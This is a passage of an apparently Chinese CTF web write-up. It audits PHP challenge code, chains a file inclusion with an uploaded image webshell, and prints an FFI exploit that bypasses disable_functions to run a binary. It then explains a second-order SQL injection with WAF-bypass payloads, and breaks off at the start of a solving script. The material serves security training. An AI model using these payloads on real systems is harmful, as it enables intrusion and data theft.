<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php?action=class.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class.php主要函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_file_exist</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_file_size</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;KB&#x27;</span>, <span class="string">&#x27;MB&#x27;</span>, <span class="string">&#x27;GB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">1</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable">$units</span>[<span class="variable">$i</span>];<span class="comment">#浮点数四舍五入,保留1位小数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete_file</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_file_contents</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于存在<code>file_exists</code>,推测可能存在phar反序列化</p>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sent&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file_array</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_location</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$file_num</span> = <span class="title function_ invoke__">sizeof</span>(<span class="variable">$file_array</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$file_num</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$file_num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$this_file_json_object</span> = <span class="variable">$file_array</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$this_file</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$this_file_json_object</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$this_file_name</span> = <span class="variable">$this_file</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_type</span> = <span class="variable">$this_file</span>[<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_data</span> = <span class="variable">$this_file</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this_file_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$this_file_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$this_file_extension</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$this_file_extension</span> == <span class="string">&quot;jpeg&quot;</span>) &amp;&amp; (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/jpeg&quot;</span>)) || ((<span class="variable">$this_file_extension</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/png&quot;</span>)) || ((<span class="variable">$this_file_extension</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/gif&quot;</span>))) &#123;</span><br><span class="line">            <span class="variable">$this_file_name</span> = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdGHs&#x27;</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>), <span class="number">11</span>, <span class="number">4</span>) . <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="variable">$this_file_name</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$this_file_extension</span>;</span><br><span class="line">            <span class="variable">$this_file_save_path</span> = <span class="variable">$file_location</span> . <span class="variable">$this_file_name</span>;</span><br><span class="line">            <span class="variable">$this_file_decode_data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this_file_data</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this_file_save_path</span>, <span class="variable">$this_file_decode_data</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/jpeg&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$im</span> = @<span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$this_file_save_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$this_file_type</span> == <span class="string">&quot;image/png&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$im</span> = @<span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$this_file_save_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$this_file_type</span> == <span class="string">&quot;image/gif&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$im</span> = @<span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$this_file_save_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">            <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$this_file_name</span>);<span class="comment">#在数据库中保存文件名</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到存在<code>imagecreatefromjpeg</code>,<code>imagecreatefrompng</code>以及<code>imagecreatefromgif</code>进行二次渲染,可以上传一张二次渲染后仍然保留webshell的图片,并利用<code>index.php</code>中的<code>action</code>进行文件包含进而getshell</p>
<p><a target="_blank" rel="noopener" href="https://github.com/AMDyesIntelno/huaQ/tree/master/%E9%9D%B6%E5%9C%BA/upload-labs(%E5%B7%B2%E5%AE%8C%E6%88%90)#pass-16">upload-labs 二次渲染绕过</a></p>
<p>在使用蚁剑等webshell管理工具进行链接时要注意设置cookie,同时建议使用代理</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/imgbed-1.png"></p>
<p>查看根目录,可以看到存在<code>readflag</code>和<code>flag</code>,并且根据权限可知需要运行<code>readflag</code>去getflag</p>
<p>检查phpinfo,发现禁止了大量函数<code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</code></p>
<p>根据题目描述并检查phpinfo,发现配置并开启了ffi,因此可以利用ffi bypass disable function</p>
<p>exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;/readflag&quot;</span>;</span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/out&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/out&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/out&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将该文件放到<code>/tmp</code>目录下,利用index.php的action进行包含即可getflag</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/imgbed-2.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/imgbed-3.png"></p>
<p>当然也可以直接使用蚁剑的bypass disable function插件</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/imgbed-4.png"></p>
<hr>
<p>除了对二次渲染后的图片进行包含外,还可以对<code>phpinfo.php</code>进行包含</p>
<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">PHP文件包含漏洞(利用phpinfo)</a></p>
<h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium-sql"></a>medium-sql</h2><h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>在<code>class.php</code>中可能存在二次注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_email</span>(<span class="params"><span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql_query</span> = <span class="string">&quot;SELECT username FROM users where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;sql, <span class="variable">$sql_query</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$row</span>-&gt;<span class="title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$result</span>[<span class="number">0</span>][<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$this</span>-&gt;sql, <span class="variable">$email</span>);</span><br><span class="line">    <span class="variable">$sql_query</span> = <span class="string">&quot;INSERT INTO `email` (`id`, `username`, `email`, `time`) VALUES (NULL,&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$email</span>&#x27;,NOW())&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;sql-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_query</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list_email</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql_query</span> = <span class="string">&quot;SELECT username FROM users where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;sql, <span class="variable">$sql_query</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$row</span>-&gt;<span class="title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$result</span>[<span class="number">0</span>][<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql_query</span> = <span class="string">&quot;SELECT email,time FROM email where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;sql, <span class="variable">$sql_query</span>);</span><br><span class="line">    <span class="variable">$posi</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;container&quot;&gt;&lt;table class=&quot;table&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th scope=&quot;col&quot;&gt;#&lt;/th&gt;&lt;th scope=&quot;col&quot;&gt;Email&lt;/th&gt;&lt;th scope=&quot;col&quot;&gt;Time&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$result</span> = <span class="variable">$row</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&lt;th scope=&quot;row&quot;&gt;&#x27;</span> . <span class="variable">$posi</span>++ . <span class="string">&#x27;&lt;/th&gt;&lt;td&gt;&#x27;</span> . <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] . <span class="string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span> . <span class="variable">$result</span>[<span class="string">&#x27;time&#x27;</span>] . <span class="string">&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>add_email</code>和<code>list_email</code>中所使用的<code>usernane</code>均来自数据库查询得到的结果,假设在注册时我们注册一个名为<code>&#39; or 1#</code>的用户(暂时忽略waf)</p>
<p>在注册过程中,由于存在<code>mysqli_real_escape_string</code>,敏感字符会被转义后再执行sql语句,但是从数据库取出<code>username</code>后,并没有执行相应的<code>mysqli_real_escape_string</code>,因此<code>SELECT email,time FROM email where username = &#39;$username&#39;</code>会变成<code>SELECT email,time FROM email where username = &#39;&#39; or 1#&#39;</code>因此造成了二次注入</p>
<h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$value</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$blackList</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%00&#x27;</span>), <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>), <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0A&#x27;</span>), <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0B&#x27;</span>), <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0C&#x27;</span>), <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0D&#x27;</span>), <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%A0&#x27;</span>), <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;()&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;between&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;extractvalue&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;sleep&#x27;</span>, <span class="string">&#x27;medium&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blackList</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="variable">$item</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>由于过滤了<code>or</code>和<code>and</code>,因此使用<code>||</code>和<code>&amp;&amp;</code>代替</p>
</li>
<li><p>因为过滤了<code>or</code>,所以<code>information_schema</code>用<code>sys.schema_auto_increment_columns</code>代替</p>
</li>
<li><p><code>=</code>被过滤,使用<code>like</code>或者<code>regexp</code>代替</p>
</li>
<li><p>空格和空格的其他形式被过滤,使用<code>()</code>即<code>select(flag)from(xxx)</code>进行代替</p>
</li>
<li><p><code>#</code>和<code>-</code>被过滤,构造<code>||&#39;</code>去闭合最后的<code>&#39;</code></p>
</li>
<li><p><code>substr</code>被过滤,可以使用<code>mid</code>代替</p>
</li>
<li><p><code>medium</code>被过滤,可以使用十六进制<code>0x6d656469756d</code>代替</p>
</li>
<li><p><code>^</code>被过滤,可使用<code>$</code>来从后往前进行匹配</p>
</li>
</ol>
<h3 id="查询medium下的表"><a href="#查询medium下的表" class="headerlink" title="查询medium下的表"></a>查询medium下的表</h3><p><code>xxx&#39;||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)regexp&#39;%s$&#39;)||&#39;</code></p>
<p><code>xxx&#39;||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)like(&#39;%s&#39;))||&#39;</code></p>
<p>得到<code>c1c7fbbb74d0d43101a2814ade767362,email,users</code></p>
<h3 id="查询c1c7fbbb74d0d43101a2814ade767362"><a href="#查询c1c7fbbb74d0d43101a2814ade767362" class="headerlink" title="查询c1c7fbbb74d0d43101a2814ade767362"></a>查询c1c7fbbb74d0d43101a2814ade767362</h3><p>题目提示flag在c1c7fbbb74d0d43101a2814ade767362列中</p>
<p><code>xxx&#39;||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)regexp&#39;%s$&#39;)||&#39;</code></p>
<p><code>xxx&#39;||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)like(&#39;%s&#39;))||&#39;</code></p>
<p>完整脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 